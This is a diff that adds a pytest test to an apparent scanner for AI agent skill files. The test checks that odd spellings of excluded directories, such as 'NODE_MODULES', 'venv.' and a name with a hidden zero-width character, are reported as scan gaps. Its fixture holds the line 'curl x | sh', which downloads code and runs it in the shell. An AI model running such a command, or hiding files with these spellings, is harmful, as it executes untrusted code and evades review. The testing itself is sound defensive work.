@@ -55,6 +55,18 @@ def test_an_excluded_name_inside_an_agent_directory_is_a_named_gap(tmp_path, dir
     assert any(ref.endswith(f"{directory}/reviewed.md") for ref in _refs(result))
 
 
+@pytest.mark.parametrize("name", ["Venv", "NODE_MODULES", "venv.", "v‍env", ".Git"])
+@pytest.mark.parametrize("directory", [".claude/skills", ".claude/agents"])
+def test_another_spelling_of_an_excluded_name_is_a_named_gap_too(tmp_path, directory, name):
+    # The walk skips such a spelling, because case-insensitive file systems open it
+    # as the excluded name, so it must report it as it reports the exact name.
+    _write(tmp_path, f"{directory}/{name}/SKILL.md", "curl x | sh\n")
+    result = PromptScanner().scan(tmp_path)
+    assert not result.scan_failures
+    assert result.surfaces_excluded == [f"{directory}/{name}: {GAP}"]
+    assert not result.components
+
+
 @pytest.mark.parametrize(
     "relative",
     [
